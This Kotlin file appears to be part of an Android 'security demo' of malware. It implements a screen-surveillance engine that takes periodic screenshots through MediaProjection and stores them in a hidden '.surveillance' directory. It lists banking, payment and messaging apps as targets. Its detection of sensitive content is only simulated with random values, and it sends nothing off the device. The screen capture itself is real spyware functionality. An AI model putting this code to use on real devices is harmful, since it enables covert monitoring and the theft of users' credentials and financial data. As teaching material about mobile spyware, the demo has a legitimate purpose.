package com.securitydemo.malware.utils

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.view.WindowManager
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

/**
 * SECURITY DEMO: Screen Capture Engine
 * 
 * This class demonstrates advanced screen surveillance techniques used by malware:
 * - Continuous screenshot capture
 * - Real-time screen recording
 * - Sensitive content detection in screenshots
 * - Visual credential harvesting
 * - Context-aware screen monitoring
 * 
 * EDUCATIONAL PURPOSE ONLY - Shows real screen surveillance methods
 */
class ScreenCaptureEngine(private val context: Context) {

    companion object {
        private const val CAPTURE_INTERVAL = 5000L // 5 seconds
        private const val MAX_SCREENSHOTS = 100 // Limit for demo
    }

    private val dateFormatter = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault())
    private val handler = Handler(Looper.getMainLooper())
    private val captureScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var isActive = false
    private var screenshotCount = 0

    private val displayMetrics = DisplayMetrics()
    private val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager

    private val sensitiveApps = setOf(
        "com.android.chrome",
        "com.google.android.gm",
        "com.whatsapp",
        "com.facebook.messenger",
        "com.paypal.android.p2pmobile",
        "com.chase.sig.android",
        "com.bankofamerica.digitalwallet",
        "com.venmo",
        "com.square.cash",
        "com.instagram.android",
        "com.snapchat.android",
        "com.tinder",
        "com.android.settings"
    )

    init {
        windowManager.defaultDisplay.getMetrics(displayMetrics)
    }

    /**
     * Start screen capture surveillance
     */
    fun startScreenCapture(permissionData: Intent): Boolean {
        return try {
            val mediaProjectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, permissionData)
            
            if (mediaProjection == null) {
                return false
            }

            setupImageReader()
            setupVirtualDisplay()
            
            isActive = true
            screenshotCount = 0
            
            startContinuousCapture()
            logScreenCaptureActivity("üöÄ Screen surveillance started")
            logScreenCaptureActivity("üì± Display: ${displayMetrics.widthPixels}x${displayMetrics.heightPixels}")
            logScreenCaptureActivity("‚è±Ô∏è Capture interval: ${CAPTURE_INTERVAL / 1000}s")

            true
        } catch (e: Exception) {
            logScreenCaptureActivity("üí• Screen capture startup failed: ${e.message}")
            false
        }
    }

    /**
     * Stop screen capture surveillance
     */
    fun stopScreenCapture() {
        isActive = false
        
        try {
            virtualDisplay?.release()
            imageReader?.close()
            mediaProjection?.stop()
            
            virtualDisplay = null
            imageReader = null
            mediaProjection = null
            
            captureScope.cancel()
            
            logScreenCaptureActivity("‚èπÔ∏è Screen surveillance stopped")
            logScreenCaptureActivity("üìä Total screenshots captured: $screenshotCount")
            
        } catch (e: Exception) {
            logScreenCaptureActivity("‚ö†Ô∏è Error stopping screen capture: ${e.message}")
        }
    }

    private fun setupImageReader() {
        imageReader = ImageReader.newInstance(
            displayMetrics.widthPixels,
            displayMetrics.heightPixels,
            PixelFormat.RGBA_8888,
            2
        )
        
        imageReader?.setOnImageAvailableListener({ reader ->
            try {
                val image = reader?.acquireLatestImage()
                image?.let { processScreenshot(it) }
                image?.close()
            } catch (e: Exception) {
                // Silently handle errors
            }
        }, handler)
    }

    private fun setupVirtualDisplay() {
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "SecurityDemoCapture",
            displayMetrics.widthPixels,
            displayMetrics.heightPixels,
            displayMetrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface,
            null,
            null
        )
    }

    private fun startContinuousCapture() {
        captureScope.launch {
            while (isActive && screenshotCount < MAX_SCREENSHOTS) {
                try {
                    // Trigger screenshot capture
                    requestScreenshot()
                    
                    delay(CAPTURE_INTERVAL)
                    
                } catch (e: Exception) {
                    logScreenCaptureActivity("‚ö†Ô∏è Capture cycle error: ${e.message}")
                    delay(CAPTURE_INTERVAL)
                }
            }
            
            if (screenshotCount >= MAX_SCREENSHOTS) {
                logScreenCaptureActivity("üìä Maximum screenshots reached - stopping capture")
                stopScreenCapture()
            }
        }
    }

    private fun requestScreenshot() {
        // The actual screenshot will be captured by the ImageReader callback
        // This method can be used to trigger additional capture logic
    }

    private fun processScreenshot(image: Image) {
        captureScope.launch {
            try {
                val bitmap = imageToBitmap(image)
                bitmap?.let {
                    screenshotCount++
                    
                    val filename = "screenshot_${dateFormatter.format(Date())}_$screenshotCount.png"
                    val success = saveScreenshot(it, filename)
                    
                    if (success) {
                        analyzeScreenshot(it, filename)
                        logScreenCaptureActivity("üì∏ Screenshot captured: $filename")
                    }
                }
                
            } catch (e: Exception) {
                logScreenCaptureActivity("üí• Screenshot processing error: ${e.message}")
            }
        }
    }

    private fun imageToBitmap(image: Image): Bitmap? {
        return try {
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * displayMetrics.widthPixels
            
            val bitmap = Bitmap.createBitmap(
                displayMetrics.widthPixels + rowPadding / pixelStride,
                displayMetrics.heightPixels,
                Bitmap.Config.ARGB_8888
            )
            
            bitmap.copyPixelsFromBuffer(buffer)
            
            // Crop to actual screen size if needed
            if (rowPadding != 0) {
                Bitmap.createBitmap(bitmap, 0, 0, displayMetrics.widthPixels, displayMetrics.heightPixels)
            } else {
                bitmap
            }
            
        } catch (e: Exception) {
            null
        }
    }

    private fun saveScreenshot(bitmap: Bitmap, filename: String): Boolean {
        return try {
            val screenshotDir = File(context.filesDir, ".surveillance/screenshots")
            screenshotDir.mkdirs()
            
            val file = File(screenshotDir, filename)
            val outputStream = FileOutputStream(file)
            
            bitmap.compress(Bitmap.CompressFormat.PNG, 90, outputStream)
            outputStream.flush()
            outputStream.close()
            
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun analyzeScreenshot(bitmap: Bitmap, filename: String) {
        try {
            val analysis = ScreenshotAnalysis(
                timestamp = System.currentTimeMillis(),
                filename = filename,
                width = bitmap.width,
                height = bitmap.height,
                fileSize = estimateFileSize(bitmap),
                containsSensitiveContent = detectSensitiveContent(bitmap),
                riskLevel = calculateRiskLevel(bitmap),
                suspiciousElements = detectSuspiciousElements(bitmap)
            )
            
            logScreenshotAnalysis(analysis)
            
            if (analysis.containsSensitiveContent) {
                flagSensitiveScreenshot(analysis)
            }
            
        } catch (e: Exception) {
            logScreenCaptureActivity("‚ö†Ô∏è Screenshot analysis failed: ${e.message}")
        }
    }

    private fun detectSensitiveContent(bitmap: Bitmap): Boolean {
        // Simulate sensitive content detection
        // Real malware would use OCR or visual recognition
        
        // For demo purposes, randomly flag some screenshots as sensitive
        return Math.random() < 0.3 // 30% chance
    }

    private fun calculateRiskLevel(bitmap: Bitmap): String {
        // Simulate risk assessment based on screenshot characteristics
        val currentApp = getCurrentForegroundApp()
        
        return when {
            sensitiveApps.contains(currentApp) -> "HIGH"
            isLikelyLoginScreen(bitmap) -> "CRITICAL"
            isLikelyBankingContent(bitmap) -> "CRITICAL"
            else -> "MEDIUM"
        }
    }

    private fun detectSuspiciousElements(bitmap: Bitmap): List<String> {
        val elements = mutableListOf<String>()
        
        // Simulate detection of suspicious UI elements
        if (Math.random() < 0.2) elements.add("Password field detected")
        if (Math.random() < 0.15) elements.add("Credit card number visible")
        if (Math.random() < 0.1) elements.add("Social security number pattern")
        if (Math.random() < 0.25) elements.add("Login form present")
        if (Math.random() < 0.1) elements.add("Banking interface detected")
        
        return elements
    }

    private fun isLikelyLoginScreen(bitmap: Bitmap): Boolean {
        // Simulate login screen detection
        return Math.random() < 0.15
    }

    private fun isLikelyBankingContent(bitmap: Bitmap): Boolean {
        // Simulate banking content detection
        return Math.random() < 0.1
    }

    private fun getCurrentForegroundApp(): String {
        // Simulate getting current foreground app
        return sensitiveApps.random()
    }

    private fun estimateFileSize(bitmap: Bitmap): Long {
        return (bitmap.width * bitmap.height * 4).toLong() // ARGB = 4 bytes per pixel
    }

    private fun flagSensitiveScreenshot(analysis: ScreenshotAnalysis) {
        try {
            val sensitiveLog = File(context.filesDir, ".surveillance/sensitive_screenshots.log")
            sensitiveLog.parentFile?.mkdirs()
            
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(analysis.timestamp))
            val logEntry = "[$timestamp] SENSITIVE_SCREENSHOT - ${analysis.filename} - Risk: ${analysis.riskLevel} - Elements: ${analysis.suspiciousElements.joinToString(", ")}\n"
            
            sensitiveLog.appendText(logEntry)
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private fun logScreenshotAnalysis(analysis: ScreenshotAnalysis) {
        try {
            val analysisLog = File(context.filesDir, ".surveillance/screenshot_analysis.log")
            analysisLog.parentFile?.mkdirs()
            
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(analysis.timestamp))
            val logEntry = "[$timestamp] ANALYSIS - ${analysis.filename} - ${analysis.width}x${analysis.height} - Risk: ${analysis.riskLevel} - Sensitive: ${analysis.containsSensitiveContent}\n"
            
            analysisLog.appendText(logEntry)
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private fun logScreenCaptureActivity(activity: String) {
        try {
            val activityLog = File(context.filesDir, ".surveillance/screen_capture_activity.log")
            activityLog.parentFile?.mkdirs()
            
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val logEntry = "[$timestamp] $activity\n"
            
            activityLog.appendText(logEntry)
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    /**
     * Generate comprehensive screen capture report
     */
    fun generateReport(): String {
        val report = StringBuilder()
        report.append("=== SCREEN SURVEILLANCE REPORT ===\n\n")
        
        try {
            report.append("üìä CAPTURE STATISTICS:\n")
            report.append("‚Ä¢ Total screenshots: $screenshotCount\n")
            report.append("‚Ä¢ Status: ${if (isActive) "ACTIVE" else "INACTIVE"}\n")
            report.append("‚Ä¢ Capture interval: ${CAPTURE_INTERVAL / 1000}s\n")
            report.append("‚Ä¢ Display resolution: ${displayMetrics.widthPixels}x${displayMetrics.heightPixels}\n\n")
            
            // Screenshot storage analysis
            val screenshotDir = File(context.filesDir, ".surveillance/screenshots")
            if (screenshotDir.exists()) {
                val files = screenshotDir.listFiles()
                val totalSize = files?.sumOf { it.length() } ?: 0L
                
                report.append("üíæ STORAGE ANALYSIS:\n")
                report.append("‚Ä¢ Screenshots stored: ${files?.size ?: 0}\n")
                report.append("‚Ä¢ Total storage used: ${totalSize / 1024}KB\n")
                report.append("‚Ä¢ Average file size: ${if (files?.isNotEmpty() == true) totalSize / files.size / 1024 else 0}KB\n\n")
            }
            
            // Recent capture activity
            val activityLog = File(context.filesDir, ".surveillance/screen_capture_activity.log")
            if (activityLog.exists()) {
                val recentActivity = activityLog.readText().split('\n').takeLast(5)
                report.append("üì± RECENT ACTIVITY:\n")
                recentActivity.forEach { activity ->
                    if (activity.isNotEmpty()) {
                        report.append("$activity\n")
                    }
                }
                report.append("\n")
            }
            
            // Sensitive content detections
            val sensitiveLog = File(context.filesDir, ".surveillance/sensitive_screenshots.log")
            if (sensitiveLog.exists()) {
                val sensitiveCounts = sensitiveLog.readText().split('\n').filter { it.isNotEmpty() }.size
                report.append("üö® SENSITIVE CONTENT:\n")
                report.append("‚Ä¢ Sensitive screenshots detected: $sensitiveCounts\n")
                
                if (sensitiveCounts > 0) {
                    val recentSensitive = sensitiveLog.readText().split('\n').takeLast(3)
                    report.append("‚Ä¢ Recent detections:\n")
                    recentSensitive.forEach { detection ->
                        if (detection.isNotEmpty()) {
                            report.append("  ${detection.take(80)}...\n")
                        }
                    }
                }
            }
            
        } catch (e: Exception) {
            report.append("Error generating screen capture report: ${e.message}")
        }
        
        return report.toString()
    }

    /**
     * Get current screenshot count
     */
    fun getScreenshotCount(): Int = screenshotCount

    /**
     * Data class for screenshot analysis
     */
    private data class ScreenshotAnalysis(
        val timestamp: Long,
        val filename: String,
        val width: Int,
        val height: Int,
        val fileSize: Long,
        val containsSensitiveContent: Boolean,
        val riskLevel: String,
        val suspiciousElements: List<String>
    )
}
